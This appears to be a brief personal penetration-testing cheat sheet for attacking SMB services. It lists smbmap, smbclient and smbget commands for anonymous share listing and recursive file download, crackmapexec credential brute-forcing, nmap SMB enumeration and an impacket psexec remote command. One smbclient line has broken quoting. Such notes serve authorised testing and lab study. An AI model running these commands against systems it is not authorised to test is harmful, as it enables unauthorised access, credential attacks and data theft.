# linux attack

## smbmap

### list smb shares as guest/nobody to host

```bash
smbmap -u guest -H "$rhost"
smbmap -u '' -p '' -H "$rhost"
smbmap -u 'nobody' -p '' -H "$rhost"
```

### list smb shares as anonymous to host

```bash
smbmap -H "$rhost"
```

### print shares recursivly

```bash
smbmap -u <user> -p <password> -H <rhost> -R
```

## smbclient

### list shares

```bash
smbclient -L <computer-name/ip>
```

### connect as anonymous (dont ask for pw)

```bash
smbclient -N //"$rhost"/SomeDir
```

### connect as guest

```bash
smbclient -U guest //"$rhost"/SomeDir
```

### recursive download files via smbclient version 1

1. connect
2. cd folder
3. type: mask
4. type: recurse
5. type: prompt
6. mget *

### recursive download files via smbclient version 2

```bash
smbclient "\\$rhost\share" -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'`
```

## crackmapexec

### bruteforce smb shares

```bash
crackmapexec smb $rhost -u pot-user.txt -p pot-passwords.txt --continue-on-success
crackmapexec smb $rhost -u pot-user.txt -p pot-passwords.txt
```

## smbget

### download all files from smb share as Anonymous

```bash
smbget -R smb://<rhost>/<share> -U Anonymous
```

# download all files from smb share as user + password

```bash
smbget -R smb://<rhost>/share/ -U <User>%<Password>
```

## nmap 

```bash
nmap --script "safe or smb-enum-*" -p 445 "$rhost"
```

## psexec

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py <user>:'<password>'@"$rhost" whoami
```
